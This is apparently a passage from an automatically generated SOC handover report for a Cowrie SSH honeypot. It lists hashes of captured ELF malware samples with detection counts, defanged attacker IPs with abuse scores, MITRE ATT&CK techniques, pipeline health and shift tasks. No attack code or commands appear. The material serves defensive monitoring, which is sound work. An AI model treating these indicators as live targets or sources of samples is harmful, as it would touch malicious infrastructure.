| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `166.62.92[.]145` | US | GoDaddy.com, LLC | **100** ⚠️ | 15 |
| `114.29.11[.]190` | KR | HVChungnam | **100** ⚠️ | 16 |
| `103.59.163[.]132` | MM | GOLDEN DRAGON 2000 COMPANY LIMITED t/a Dragon Net | **100** ⚠️ | 50 |
| `220.205.123[.]19` | CN | China Unicom | **100** ⚠️ | 20 |
| `192.227.213[.]228` | US | ColoCrossing | **100** ⚠️ | 17 |
| `20.64.105[.]39` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `167.172.93[.]203` | SG | DigitalOcean, LLC | **100** ⚠️ | 14 |
| `8.222.246[.]27` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 50 |
| `106.13.69[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `43.133.61[.]150` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 99 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 48 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 38 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 254 cases |
| Tool 34  | Credential Extractor        | ✅ 86 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (1.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 38 priority case(s) shown individually · 31 recon entry/entries in table (15 group(s) consolidating 197 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-14T12:01:36Z_
